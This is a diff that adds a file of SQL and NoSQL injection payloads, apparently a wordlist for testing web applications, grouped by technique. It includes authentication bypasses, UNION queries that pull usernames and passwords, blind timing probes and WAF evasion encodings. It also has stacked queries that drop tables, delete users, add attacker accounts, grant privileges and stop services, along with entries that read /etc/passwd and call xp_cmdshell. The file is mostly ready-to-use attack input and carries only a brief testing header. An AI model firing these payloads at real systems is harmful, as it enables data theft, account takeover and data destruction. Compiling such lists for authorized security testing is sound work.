@@ -1,0 +1,274 @@
+# SQL Injection Payloads
+# PURPOSE: Test if website properly sanitizes database queries
+# DANGER: Can expose entire database, delete data, or bypass authentication
+
+# Basic SQLi - Authentication bypass
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR 1=1--
+admin' --
+admin' #
+' OR 'x'='x
+') OR ('1'='1
+
+# Classic SQLi
+1' OR '1' = '1
+1' OR 1 -- -
+' OR 1=1 LIMIT 1 --
+' OR '1'='1' LIMIT 1 --
+
+# UNION-based SQLi
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1' UNION SELECT NULL,username,password FROM users--
+
+# Error-based SQLi (forces database errors)
+'
+''
+"
+""
+\'
+\''
+1'1
+1"1
+'OR'
+' OR 1=1
+
+# Time-based blind SQLi
+' OR SLEEP(5)--
+'; WAITFOR DELAY '00:00:05'--
+' OR pg_sleep(5)--
+1' AND SLEEP(5)--
+
+# Boolean-based blind SQLi
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+
+# Stacked queries
+'; DROP TABLE users--
+'; DELETE FROM users--
+'; UPDATE users SET password='hacked'--
+
+# Comment-based
+' OR 1=1 #
+' OR 1=1 --
+' OR 1=1 /*
+
+# Advanced
+' AND 1 IN (SELECT COUNT(*) FROM users)--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+
+# Database-specific
+
+# MySQL
+' OR '1'='1' #
+' UNION SELECT @@version--
+
+# PostgreSQL
+' OR '1'='1' --
+' UNION SELECT version()--
+
+# MSSQL
+' OR '1'='1' --
+' UNION SELECT @@version--
+
+# Oracle
+' OR '1'='1
+' UNION SELECT NULL FROM dual--
+
+# Advanced Boolean-Based Blind
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
+' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
+' AND (SELECT LENGTH(username) FROM users WHERE id=1)=5--
+' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--
+
+# Time-Based Blind (Advanced)
+'; WAITFOR DELAY '00:00:10'--
+' AND (SELECT COUNT(*) FROM users) > 0 AND BENCHMARK(50000000,MD5('test'))--
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+' RLIKE (SELECT (CASE WHEN (1=1) THEN 0x28 ELSE 0x28 END)) AND SLEEP(10)--
+
+# Error-Based SQL Injection
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+'; exec master..xp_cmdshell 'ping 127.0.0.1'--
+
+# UNION-Based Advanced
+' UNION SELECT null,null,null,table_name,null FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT null,column_name,null,null,null FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null,concat(username,':',password),null,null,null FROM users--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+
+# NoSQL Injection
+' || '1'=='1
+' && '1'=='1
+'; return true; var dummy='
+{"$ne": null}
+{"$regex": ".*"}
+{"$where": "this.username == this.password"}
+
+# Second-Order SQL Injection
+admin'/*
+test'; INSERT INTO logs VALUES ('injected')-- 
+user'; UPDATE users SET password=MD5('hacked') WHERE username='admin'-- 
+
+# Bypass Filter Techniques
+' /**/OR/**/ '1'='1'/**/ --
+' %23OR%20 '1'='1' %23
+' /*!OR*/ '1'='1' /*!*/--
+'/**/UNION/**/SELECT/**/null,null--
+'+UNION+SELECT+null,version()--
+
+# WAF Bypass SQL Injection
+/*!50000UNION*/ /*!50000SELECT*/ version()--
+'union/**/select/**/version()--
+'/**/union/**/select/**/user()--
+'+union+distinctROW+select+1,version(),3--
+'%20union%20select%20version()--
+
+# Database Fingerprinting
+' AND @@version LIKE '%MySQL%'--
+' AND version() LIKE '%PostgreSQL%'--
+' AND (SELECT sqlite_version())--
+'; SELECT banner FROM v$version--
+
+# Data Exfiltration Techniques
+' UNION SELECT load_file('/etc/passwd'),null--
+' UNION SELECT null,hex(load_file('/etc/passwd'))--
+'; SELECT * FROM users INTO OUTFILE '/var/www/html/users.txt'--
+' UNION SELECT user_name,password FROM master.dbo.syslogins--
+
+# Advanced Timing Attacks
+' AND IF(1=1,SLEEP(10),0)--
+'; IF (1=1) WAITFOR DELAY '00:00:10'--
+' AND (SELECT * FROM (SELECT(SLEEP(10)))test)--
+'; SELECT CASE WHEN (username='admin') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+
+# Stacked Queries Advanced
+'; CREATE TABLE injection (id INT, data VARCHAR(100))--
+'; INSERT INTO users (username,password) VALUES ('hacker','pwd123')--
+'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--
+'; EXEC master..xp_servicecontrol 'stop','mysql'--
+
+# Polygon and Multi-Vector
+'+(SELECT * FROM (SELECT(SLEEP(10)))test)+'
+' AND (SELECT * FROM (SELECT BENCHMARK(10000000,MD5('test')))test)--
+'/**/AND/**/(SELECT/**/SUBSTRING(@@version,1,1))='5'--
+' OR '1'='1'/**/AND/**/'admin'='admin
+
+# Authentication Bypass Advanced
+admin'-- 
+admin'/*
+admin' OR 1=1-- 
+admin' OR 1=1#
+admin' OR 1=1/*
+admin') OR ('1'='1'-- 
+admin') OR ('1'='1'#
+admin') OR ('1'='1'/*
+
+# Content-Type Based
+'; LOAD DATA INFILE '/etc/passwd' INTO TABLE temp--
+'; SELECT * FROM temp--
+' UNION SELECT null,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT null,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+
+# Binary and Hex Encoding
+0x61646d696e27206f722027313d31
+CHAR(97,100,109,105,110,39,32,111,114,32,39,49,61,49)
+admin' OR CHAR(49)=CHAR(49)--
+' OR HEX('admin')=HEX('admin')--
+
+# JSON and XML Injection
+'; SELECT EXTRACTVALUE('<root><user>admin</user></root>','/root/user')--
+' UNION SELECT JSON_EXTRACT('{"users":"admin"}','$.users')--
+' OR JSON_VALID('{"test":"value"}')--
+' AND JSON_CONTAINS('{"key":"value"}','{"key":"value"}')--
+
+# BRUTAL MODE PAYLOADS (Advanced SQL Injection)
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1
+" OR "1"="1
+') OR ('1'='1
+") OR ("1"="1
+')) OR (('1'='1
+")) OR (("1"="1
+' OR 1=1#
+" OR 1=1#
+' OR '1'='1'#
+" OR "1"="1"#
+') OR ('1'='1'#
+") OR ("1"="1"#
+')) OR (('1'='1'#
+")) OR (("1"="1"#
+' OR 1=1/*
+" OR 1=1/*
+' OR '1'='1'/*
+" OR "1"="1"/*
+') OR ('1'='1'/*
+") OR ("1"="1"/*
+')) OR (('1'='1'/*
+")) OR (("1"="1"/*
+admin' --
+admin' #
+admin'/*
+admin" --
+admin" #
+admin"/*
+
+# EXPANDED SQLI PAYLOADS
+' OR '1'='1' --+
+' OR '1'='1' /*
+' OR 1=1 --+
+' OR 1=1 /*
+admin' --+
+admin' /*
+admin' #
+' UNION SELECT 1,2,3--+
+' UNION SELECT 1,2,3,4--+
+' UNION SELECT 1,2,3,4,5--+
+' UNION SELECT 1,2,3,4,5,6--+
+' UNION SELECT 1,2,3,4,5,6,7--+
+' UNION SELECT 1,2,3,4,5,6,7,8--+
+' UNION SELECT 1,2,3,4,5,6,7,8,9--+
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10--+
+' UNION SELECT @@version,2,3--+
+' UNION SELECT user(),2,3--+
+' UNION SELECT database(),2,3--+
+' AND 1=1
+' AND 1=2
+' AND 1=1 --+
+' AND 1=2 --+
+' AND (SELECT 1)=1
+' AND (SELECT 1)=2
+' AND SLEEP(1)
+' AND SLEEP(2)
+' AND SLEEP(3)
+' AND SLEEP(4)
+' AND SLEEP(5)
+' AND SLEEP(6)
+' AND SLEEP(7)
+' AND SLEEP(8)
+' AND SLEEP(9)
+' AND SLEEP(10)
+ORDER BY 1--+
+ORDER BY 2--+
+ORDER BY 3--+
+ORDER BY 4--+
+ORDER BY 5--+
+ORDER BY 6--+
+ORDER BY 7--+
+ORDER BY 8--+
+ORDER BY 9--+
+ORDER BY 10--+
+ORDER BY 11--+
+ORDER BY 12--+
+ORDER BY 13--+
+ORDER BY 14--+
+ORDER BY 15--+
